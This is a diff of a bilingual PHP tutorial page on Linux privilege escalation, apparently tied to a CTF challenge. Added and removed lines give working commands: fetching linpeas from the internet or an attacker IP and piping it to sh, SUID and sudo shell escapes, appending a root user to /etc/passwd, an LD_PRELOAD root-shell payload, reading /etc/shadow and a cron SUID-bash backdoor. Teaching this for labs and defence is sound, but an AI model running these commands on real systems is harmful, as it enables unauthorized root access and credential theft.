@@ -14,301 +14,134 @@ ob_start(); if ($lang==='es'): ?>
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # Transferir desde tu máquina atacante (servidor HTTP):
-# En atacante:
 python3 -m http.server 8000
-
 # En víctima:
 wget http://TU_IP:8000/linpeas.sh -O /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
-/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt
+/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt</code></pre>
 
-# Solo mostrar hallazgos de alta criticidad (amarillo/rojo):
-/tmp/linpeas.sh -a 2>/dev/null | grep -E "\[.\+.\]|\[!\]"</code></pre>
-
-  <h2>2. Binarios SUID/SGID explotables</h2>
-  <pre><code># Buscar binarios con bit SUID activado:
-find / -perm -4000 -type f 2>/dev/null
-find / -perm -u=s -type f 2>/dev/null
-
-# Buscar binarios SGID:
-find / -perm -2000 -type f 2>/dev/null
-
-# Ejemplos de binarios SUID peligrosos:
-# /usr/bin/find — ejecutar comandos como root:
-find /tmp -exec /bin/bash -p \; 2>/dev/null
-
-# /usr/bin/vim — abrir shell:
-vim -c ':!/bin/bash'
-
-# /usr/bin/python3:
-python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
-
-# /usr/bin/cp — sobrescribir /etc/passwd:
-openssl passwd -1 hacked123
-cp /etc/passwd /tmp/passwd.bak
-echo "hacker:HASH_GENERADO:0:0:root:/root:/bin/bash" >> /etc/passwd
-su hacker</code></pre>
-
-  <h2>3. Sudo mal configurado</h2>
+  <h2>2. Sudo mal configurado (Sudoers)</h2>
+  <p>A menudo, los administradores permiten a los usuarios ejecutar ciertos comandos como root sin necesidad de contraseña para automatizar tareas. Si esos comandos tienen funciones de ejecución anidadas, podemos saltar a una shell de root.</p>
   <pre><code># Ver qué puede ejecutar el usuario actual como sudo:
 sudo -l
-
-# Ejemplos típicos explotables:
-
-# (ALL) NOPASSWD: /usr/bin/python3
-sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # (ALL) NOPASSWD: /usr/bin/find
 sudo find / -exec /bin/bash \; -quit
 
+# (ALL) NOPASSWD: /usr/bin/python3
+sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
+
 # (ALL) NOPASSWD: /usr/bin/less
 sudo less /etc/passwd
-# dentro de less: !bash
+# una vez dentro de less, escribe: !bash</code></pre>
 
-# (ALL) NOPASSWD: /usr/bin/nano o vim
-sudo nano /etc/sudoers
-# Añadir: tu_usuario ALL=(ALL) NOPASSWD: ALL
+  <!-- ─── SECCIÓN DEL RETO CTF 06 (ESPAÑOL) ─── -->
+  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
+      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
+          <span style="animation: pulse 2s infinite;">🔴</span> Simulador de Terminal (CTF)
+      </h3>
+      <p style="margin-bottom: 1.5rem;">He preparado una terminal web que simula el acceso inicial a una máquina Linux como usuario <code>www-data</code>. Averigua qué permisos tienes y explótalos para conseguir privilegios de <code>root</code>.</p>
+      <a href="/ctf/ctf-06.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
+          &gt;_ INICIAR RETO CTF 06
+      </a>
+  </div>
 
-# sudo con variable de entorno (LD_PRELOAD):
-# Si env_keep+=LD_PRELOAD en /etc/sudoers:
-cat > /tmp/shell.c << 'EOF'
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-void _init() {
-    unsetenv("LD_PRELOAD");
-    setgid(0); setuid(0);
-    system("/bin/bash");
-}
-EOF
-gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
-sudo LD_PRELOAD=/tmp/shell.so cualquier_comando_permitido</code></pre>
+  <h2>3. Binarios SUID y SGID explotables</h2>
+  <p>Los binarios con el bit SUID activo se ejecutan con los permisos de su propietario (generalmente root) sin importar quién los lance. El portal <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> es tu mejor aliado aquí.</p>
+  <pre><code># Buscar binarios con bit SUID activado:
+find / -perm -4000 -type f 2>/dev/null
 
-  <h2>4. Tareas cron y scripts con permisos débiles</h2>
+# /usr/bin/cp (Sobrescribir contraseñas):
+openssl passwd -1 hackeado123
+echo "hacker:HASH_GENERADO:0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
+cp /tmp/passwd.bak /etc/passwd
+su hacker</code></pre>
+
+  <h2>4. PATH Hijacking (Secuestro del PATH)</h2>
+  <p>Si un binario SUID ejecuta comandos internamente (como <code>ls</code> o <code>cat</code>) sin usar su ruta absoluta (<code>/bin/ls</code>), podemos crear nuestro propio <code>ls</code> malicioso y alterar el PATH para que Linux lo ejecute como root.</p>
+  <pre><code># 1. Crear el binario falso en /tmp
+echo '/bin/bash -p' > /tmp/ls
+chmod +x /tmp/ls
+
+# 2. Secuestrar el PATH colocando /tmp el primero
+export PATH=/tmp:$PATH
+
+# 3. Ejecutar el binario SUID vulnerable que llama a "ls"
+./programa_vulnerable</code></pre>
+
+  <h2>5. Linux Capabilities</h2>
+  <p>Las <em>Capabilities</em> son una alternativa moderna a SUID que otorga permisos de root fragmentados (como poder abrir puertos o leer archivos concretos) a binarios específicos. Son más sigilosas e igual de peligrosas.</p>
+  <pre><code># Listar binarios con capabilities:
+getcap -r / 2>/dev/null
+
+# Ejemplo: Si python o tar tienen cap_dac_read_search+ep, 
+# pueden leer cualquier archivo del sistema como /etc/shadow sin ser root.
+tar -cvf shadow.tar /etc/shadow</code></pre>
+
+  <h2>6. Tareas cron y scripts con permisos débiles</h2>
   <pre><code># Listar crons del sistema:
 cat /etc/crontab
-ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/
-crontab -l
 
-# Monitorizar procesos para detectar crons en ejecución:
-# Instalar pspy64 en la víctima:
-wget http://TU_IP:8000/pspy64 -O /tmp/pspy64
-chmod +x /tmp/pspy64
-/tmp/pspy64
-
-# Si un cron ejecuta un script escribible por nosotros:
-ls -la /ruta/al/script.sh
-# Si tenemos escritura:
+# Si un cron ejecuta un script de root que es escribible por nosotros:
 echo 'chmod +s /bin/bash' >> /ruta/al/script.sh
 # Esperar a que se ejecute el cron, luego:
 /bin/bash -p</code></pre>
-
-  <h2>5. Contraseñas en texto claro y credenciales</h2>
-  <pre><code># Buscar contraseñas hardcodeadas en ficheros de configuración:
-grep -r "password" /etc/ 2>/dev/null | grep -v "^Binary"
-grep -r "passwd\|secret\|credential" /var/www/ 2>/dev/null
-find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null | xargs grep -l "password" 2>/dev/null
-
-# Historial de comandos:
-cat ~/.bash_history
-cat ~/.zsh_history
-
-# Ficheros interesantes en home:
-find /home -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
-find /root -readable 2>/dev/null
-
-# Base de datos SQLite con hashes:
-find / -name "*.db" -o -name "*.sqlite" 2>/dev/null</code></pre>
-
-  <h2>6. Servicios internos (port forwarding)</h2>
-  <pre><code># Ver puertos abiertos solo en localhost:
-ss -tlnp
-netstat -tlnp 2>/dev/null
-
-# Si hay un servicio en 127.0.0.1:8080 no expuesto:
-# Redirigir a nuestra máquina con SSH:
-ssh -L 8080:127.0.0.1:8080 usuario@victima
-
-# Acceder desde nuestro navegador a localhost:8080</code></pre>
-
-  <h2>7. Escalada por pertenencia a grupos</h2>
-  <pre><code># Ver grupos del usuario actual:
-id
-groups
-
-# Grupos peligrosos y su explotación:
-# docker: montar el sistema de archivos del host:
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-
-# disk: leer bloques del disco directamente:
-debugfs /dev/sda1
-debugfs: cat /etc/shadow
-
-# lxd/lxc: similar a Docker:
-lxc init ubuntu:16.04 test -c security.privileged=true
-lxc config device add test mydev disk source=/ path=/mnt/root recursive=true
-lxc start test
-lxc exec test /bin/sh
-
-# adm/syslog: leer logs del sistema:
-cat /var/log/auth.log | grep "password"</code></pre>
-
-  <h2>8. Checklist de escalada de privilegios</h2>
-  <table>
-    <thead><tr><th>Vector</th><th>Comando de verificación</th></tr></thead>
-    <tbody>
-      <tr><td>SUID peligrosos</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td></tr>
-      <tr><td>Sudo permisos</td><td><code>sudo -l</code></td></tr>
-      <tr><td>Crons del sistema</td><td><code>cat /etc/crontab</code></td></tr>
-      <tr><td>Procesos en tiempo real</td><td><code>./pspy64</code></td></tr>
-      <tr><td>Contraseñas en configs</td><td><code>grep -r "password" /etc/ 2>/dev/null</code></td></tr>
-      <tr><td>Puertos internos</td><td><code>ss -tlnp</code></td></tr>
-      <tr><td>Grupos peligrosos</td><td><code>id</code> → docker, disk, lxd</td></tr>
-      <tr><td>Enumeración automática</td><td><code>./linpeas.sh</code></td></tr>
-    </tbody>
-  </table>
 </div>
+
 <?php else: ?>
 <div class="prose">
   <p><strong>Privilege escalation</strong> involves exploiting misconfigurations or vulnerabilities to move from a low-privileged user (<code>www-data</code>, normal user) to <code>root</code>. It is a critical phase in any real-world intrusion or CTF challenge.</p>
 
   <h2>1. Automated Enumeration with LinPEAS</h2>
   <pre><code># Download and run LinPEAS directly on target:
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></pre>
 
-# Transfer from attacker machine (HTTP server):
-# On attacker:
-python3 -m http.server 8000
-
-# On victim:
-wget http://YOUR_IP:8000/linpeas.sh -O /tmp/linpeas.sh
-chmod +x /tmp/linpeas.sh
-/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt
-
-# Show only high-criticality findings:
-/tmp/linpeas.sh -a 2>/dev/null | grep -E "\[.\+.\]|\[!\]"</code></pre>
-
-  <h2>2. Exploitable SUID/SGID Binaries</h2>
-  <pre><code># Find SUID binaries:
-find / -perm -4000 -type f 2>/dev/null
-find / -perm -u=s -type f 2>/dev/null
-
-# Dangerous SUID examples:
-# /usr/bin/find — execute command as root:
-find /tmp -exec /bin/bash -p \; 2>/dev/null
-
-# /usr/bin/vim — open shell:
-vim -c ':!/bin/bash'
-
-# /usr/bin/python3:
-python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
-
-# /usr/bin/cp — overwrite /etc/passwd:
-openssl passwd -1 hacked123
-echo "hacker:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
-su hacker</code></pre>
-
-  <h2>3. Misconfigured Sudo</h2>
+  <h2>2. Misconfigured Sudo (Sudoers)</h2>
+  <p>Administrators often allow users to run specific commands as root without a password. If those commands have subshell features, we can spawn a root shell.</p>
   <pre><code># Check allowed sudo commands:
 sudo -l
-
-# Common exploitable entries:
-
-# (ALL) NOPASSWD: /usr/bin/python3
-sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # (ALL) NOPASSWD: /usr/bin/find
 sudo find / -exec /bin/bash \; -quit
 
 # (ALL) NOPASSWD: /usr/bin/less
 sudo less /etc/passwd
-# inside less: !bash
+# inside less, type: !bash</code></pre>
 
-# LD_PRELOAD technique (if env_keep+=LD_PRELOAD in sudoers):
-cat > /tmp/shell.c << 'EOF'
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-void _init() {
-    unsetenv("LD_PRELOAD");
-    setgid(0); setuid(0);
-    system("/bin/bash");
-}
-EOF
-gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
-sudo LD_PRELOAD=/tmp/shell.so allowed_command</code></pre>
+  <!-- ─── SECCIÓN DEL RETO CTF 06 (INGLÉS) ─── -->
+  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
+      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
+          <span style="animation: pulse 2s infinite;">🔴</span> Terminal Simulator (CTF)
+      </h3>
+      <p style="margin-bottom: 1.5rem;">I've prepared a web terminal simulating initial access to a Linux machine as user <code>www-data</code>. Enumerate your permissions and exploit them to get <code>root</code> privileges.</p>
+      <a href="/ctf/ctf-06.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
+          &gt;_ START CTF 06 CHALLENGE
+      </a>
+  </div>
 
-  <h2>4. Cron Jobs & Weak Script Permissions</h2>
-  <pre><code># List system cron jobs:
+  <h2>3. Exploitable SUID and SGID Binaries</h2>
+  <p>SUID binaries execute with the permissions of their owner (usually root). Check <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> for bypasses.</p>
+  <pre><code># Find SUID binaries:
+find / -perm -4000 -type f 2>/dev/null</code></pre>
+
+  <h2>4. PATH Hijacking</h2>
+  <p>If a SUID binary calls a system command without an absolute path (e.g., <code>ls</code> instead of <code>/bin/ls</code>), we can hijack the PATH variable to execute our own malicious binary as root.</p>
+  <pre><code>echo '/bin/bash -p' > /tmp/ls
+chmod +x /tmp/ls
+export PATH=/tmp:$PATH
+./vulnerable_suid_binary</code></pre>
+
+  <h2>5. Linux Capabilities</h2>
+  <p>Capabilities are a modern alternative to SUID, granting fragmented root permissions (like network manipulation or file reading) to specific binaries.</p>
+  <pre><code># List binaries with capabilities:
+getcap -r / 2>/dev/null</code></pre>
+
+  <h2>6. Cron Jobs & Weak Script Permissions</h2>
+  <pre><code># System crons:
 cat /etc/crontab
-ls -la /etc/cron.d/ /etc/cron.daily/
-crontab -l
 
-# Monitor running processes to catch crons (pspy64):
-wget http://YOUR_IP:8000/pspy64 -O /tmp/pspy64
-chmod +x /tmp/pspy64
-/tmp/pspy64
-
-# If a cron executes a script we can write to:
+# If a cron script is writable by our user:
 echo 'chmod +s /bin/bash' >> /path/to/script.sh
-# Wait for cron to run, then:
 /bin/bash -p</code></pre>
-
-  <h2>5. Cleartext Passwords & Credentials</h2>
-  <pre><code># Search for hardcoded passwords:
-grep -r "password" /etc/ 2>/dev/null | grep -v "^Binary"
-grep -r "passwd\|secret\|credential" /var/www/ 2>/dev/null
-
-# Command history:
-cat ~/.bash_history
-cat ~/.zsh_history
-
-# SSH keys:
-find /home -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
-
-# SQLite databases with hashes:
-find / -name "*.db" -o -name "*.sqlite" 2>/dev/null</code></pre>
-
-  <h2>6. Internal Services (Port Forwarding)</h2>
-  <pre><code># Find services only listening on localhost:
-ss -tlnp
-netstat -tlnp 2>/dev/null
-
-# Forward internal port to attacker machine via SSH:
-ssh -L 8080:127.0.0.1:8080 user@victim
-
-# Access from browser at localhost:8080</code></pre>
-
-  <h2>7. Dangerous Group Membership</h2>
-  <pre><code># Check current user groups:
-id
-groups
-
-# docker group — mount host filesystem:
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-
-# disk group — read disk blocks directly:
-debugfs /dev/sda1
-debugfs: cat /etc/shadow
-
-# lxd/lxc group:
-lxc init ubuntu:16.04 test -c security.privileged=true
-lxc config device add test mydev disk source=/ path=/mnt/root recursive=true
-lxc start test && lxc exec test /bin/sh</code></pre>
-
-  <h2>8. Privilege Escalation Checklist</h2>
-  <table>
-    <thead><tr><th>Vector</th><th>Check Command</th></tr></thead>
-    <tbody>
-      <tr><td>Dangerous SUID</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td></tr>
-      <tr><td>Sudo permissions</td><td><code>sudo -l</code></td></tr>
-      <tr><td>System cron jobs</td><td><code>cat /etc/crontab</code></td></tr>
-      <tr><td>Live processes</td><td><code>./pspy64</code></td></tr>
-      <tr><td>Passwords in configs</td><td><code>grep -r "password" /etc/ 2>/dev/null</code></td></tr>
-      <tr><td>Internal ports</td><td><code>ss -tlnp</code></td></tr>
-      <tr><td>Dangerous groups</td><td><code>id</code> → docker, disk, lxd</td></tr>
-      <tr><td>Auto-enumeration</td><td><code>./linpeas.sh</code></td></tr>
-    </tbody>
-  </table>
 </div>
 <?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
